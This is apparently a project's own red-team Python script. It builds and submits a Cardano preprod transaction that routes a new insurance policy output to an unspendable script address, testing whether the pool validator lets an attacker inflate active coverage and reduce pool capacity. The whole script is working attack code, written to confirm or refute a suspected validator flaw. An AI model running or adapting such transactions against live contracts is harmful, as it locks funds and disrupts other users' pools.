"""Red-team A-021: Policy output script credential not bound to policy_validator.

Hypothesis: ``policy_output_matches_underwrite`` (pool.ak:119) accepts ANY
``Script(_)`` credential for the policy output. An attacker can therefore
route the new policy to a "trash" script address (e.g., the lp_token
minting policy's hash, which has no spend purpose). The pool validator
still passes ``policy_funded`` because the datum and lovelace match;
``active_coverage`` is incremented in the pool by ``coverage``, but the
"policy" is permanently unspendable. The pool's capacity is reduced by
exactly ``coverage`` lovelace at a cost of ``coverage + premium + fee +
donation`` to the attacker.

This script constructs the attack tx and submits it. If the validator
accepts, A-021 is confirmed. Otherwise we learn what other constraint
catches it.

Usage::

    cd D:/aegis
    $env:AEGIS_OPERATOR_MODE = '1'
    python -m offchain.scripts.redteam_a021 --submit
"""
from __future__ import annotations

import argparse
import hashlib
import sys
import pathlib
import time

import pycardano as pyc

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / "api"))

from offchain.scripts._common import (
    assert_operator_mode,
    banner,
    load_operator_wallet,
    make_preprod_context,
)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n", 1)[0])
    parser.add_argument("--submit", action="store_true",
                        help="Actually broadcast (default: dry-run)")
    parser.add_argument("--coverage-ada", type=float, default=5.0,
                        help="Coverage to lock via the attack (ADA)")
    args = parser.parse_args()

    assert_operator_mode()
    banner("RED TEAM A-021 — phantom policy at trash script address")

    ctx = make_preprod_context()
    wallet = load_operator_wallet()

    # ------------------------------------------------------------------
    # Imports deferred so .env is loaded by _common before chain.py reads it.
    # ------------------------------------------------------------------
    from chain import (
        POOL_SCRIPT_ADDRESS, POOL_REF_SCRIPT_UTXO_ID,
        POOL_SCRIPT_HASH, POLICY_SCRIPT_HASH, LP_TOKEN_POLICY_HASH,
        ORACLE_NFT_POLICY_ID, PREPROD_SLOT_ZERO_POSIX,
    )
    from policies import (
        PolicyDatum, UnderwriteRedeemer, POOL_SPEND_EX_UNITS,
        _generate_policy_id, MIN_UTXO_LOVELACE,
    )
    from pool import _find_pool_utxo, _utxo_lovelace, PoolDatum, _resolve_ref_utxo
    from _treasury import calculate_treasury_cut
    from _donation_tx_builder import DonatingTxBuilder

    # ------------------------------------------------------------------
    # Stage the attack
    # ------------------------------------------------------------------
    coverage_lovelace = int(args.coverage_ada * 1_000_000)
    # Premium = MIN_PREMIUM (2 ADA) since coverage is small.
    premium_lovelace = 2_000_000
    duration_days = 1
    strike_price_scaled = 350_000

    pool_utxo, pool_datum = _find_pool_utxo(ctx)
    print(f"[pool] {pool_utxo.input.transaction_id}#{pool_utxo.input.index}")
    print(f"[pool] coin={_utxo_lovelace(pool_utxo)}, "
          f"total_liquidity={pool_datum.total_liquidity}, "
          f"active_coverage={pool_datum.active_coverage}")
    print(f"[pool] available={pool_datum.total_liquidity - pool_datum.active_coverage}")

    # Build the policy datum exactly as a legitimate underwrite would —
    # the attack is in the OUTPUT ADDRESS, not the datum.
    insured_pkh = bytes(wallet.address.payment_part)
    chain_posix_ms = (PREPROD_SLOT_ZERO_POSIX + ctx.last_block_slot) * 1000
    start_time_ms = chain_posix_ms - 120_000
    expiry_time_ms = start_time_ms + duration_days * 86_400_000
    policy_id = _generate_policy_id(
        insured_pkh, strike_price_scaled, coverage_lovelace,
        start_time_ms, expiry_time_ms,
    )
    policy_datum = PolicyDatum(
        policy_id=policy_id,
        insured=insured_pkh,
        strike_price=strike_price_scaled,
        coverage_amount=coverage_lovelace,
        premium_paid=premium_lovelace,
        start_time=start_time_ms,
        expiry_time=expiry_time_ms,
        oracle_nft=bytes.fromhex(ORACLE_NFT_POLICY_ID),
        pool_script_hash=bytes.fromhex(POOL_SCRIPT_HASH),
        pool_nft=pool_datum.pool_nft,
    )

    # New pool datum (legitimate): pool grows by net premium, active_coverage
    # grows by coverage. lp_supply preserved.
    protocol_fee = premium_lovelace * pool_datum.protocol_fee_bps // 10_000
    net_premium = premium_lovelace - protocol_fee
    new_pool_datum = PoolDatum(
        total_liquidity=pool_datum.total_liquidity + net_premium,
        active_coverage=pool_datum.active_coverage + coverage_lovelace,
        lp_token_policy=pool_datum.lp_token_policy,
        protocol_fee_bps=pool_datum.protocol_fee_bps,
        pool_nft=pool_datum.pool_nft,
        lp_supply=pool_datum.lp_supply,
    )

    # ATTACK: derive a "trash" script address from the lp_token policy
    # hash. This is a script credential that has NO spend purpose (lp_token
    # is mint-only), so any UTxO sent here is permanently locked.
    trash_script_hash = pyc.ScriptHash(bytes.fromhex(LP_TOKEN_POLICY_HASH))
    trash_address = pyc.Address(
        payment_part=trash_script_hash, network=pyc.Network.TESTNET,
    )
    print(f"[attack] trash address: {trash_address}")
    print(f"[attack] phantom policy datum.policy_id: {policy_id.hex()[:16]}...")
    print(f"[attack] phantom policy lovelace: {coverage_lovelace} (= coverage)")

    # ------------------------------------------------------------------
    # Build the tx
    # ------------------------------------------------------------------
    treasury_cut = calculate_treasury_cut(premium_lovelace, pool_datum.protocol_fee_bps)
    builder = DonatingTxBuilder(ctx, treasury_donation=treasury_cut)
    builder.add_input_address(wallet.address)

    pool_ref_utxo = _resolve_ref_utxo(ctx, POOL_REF_SCRIPT_UTXO_ID, "pool validator")
    underwrite_redeemer = pyc.Redeemer(
        UnderwriteRedeemer(coverage=coverage_lovelace, premium=premium_lovelace),
        ex_units=POOL_SPEND_EX_UNITS,
    )
    builder.add_script_input(
        utxo=pool_utxo, redeemer=underwrite_redeemer,
        script=pool_ref_utxo.output.script,
    )

    # Output 0: the PHANTOM policy at the trash address (instead of the
    # legitimate policy_validator address). The validator should reject.
    builder.add_output(pyc.TransactionOutput(
        address=trash_address,
        amount=max(coverage_lovelace, MIN_UTXO_LOVELACE),
        datum=policy_datum,
    ))

    # Output 1: legitimate pool continuation (NFT preserved).
    pool_address = pyc.Address.from_primitive(POOL_SCRIPT_ADDRESS)
    pool_input_value = pool_utxo.output.amount
    new_pool_lovelace = _utxo_lovelace(pool_utxo) + premium_lovelace
    if hasattr(pool_input_value, "multi_asset") and pool_input_value.multi_asset:
        new_pool_value = pyc.Value(
            coin=new_pool_lovelace,
            multi_asset=pool_input_value.multi_asset,
        )
    else:
        new_pool_value = pyc.Value(coin=new_pool_lovelace)
    builder.add_output(pyc.TransactionOutput(
        address=pool_address, amount=new_pool_value, datum=new_pool_datum,
    ))

    if args.submit:
        signed_tx = builder.build_and_sign(
            signing_keys=[wallet.skey], change_address=wallet.address,
            merge_change=False,
        )
        print(f"[build] tx_id={signed_tx.id}, "
              f"fee={int(signed_tx.transaction_body.fee)} lovelace, "
              f"donation={signed_tx.transaction_body.donation}")
        try:
            tx_hash = ctx.submit_tx(signed_tx.to_cbor())
            print(f"\n!!! ATTACK ACCEPTED — A-021 CONFIRMED !!!")
            print(f"  tx_hash: {tx_hash}")
            print(f"  cardanoscan: https://preprod.cardanoscan.io/transaction/{tx_hash}")
            print(f"  Phantom policy locked at {trash_address}")
            print(f"  Pool active_coverage now inflated by {coverage_lovelace} lovelace.")
            return 0
        except Exception as e:
            print(f"\n[VALIDATOR REJECTED]")
            print(f"  This is the EXPECTED outcome if A-021 is properly mitigated.")
            print(f"  Error: {str(e)[:400]}")
            return 0
    else:
        body = builder.build(change_address=wallet.address, merge_change=False)
        print(f"[dry-run] tx body fee={int(body.fee)}, donation={body.donation}, "
              f"outputs={len(body.outputs)}, inputs={len(body.inputs)}")
        return 0


if __name__ == "__main__":
    sys.exit(main())
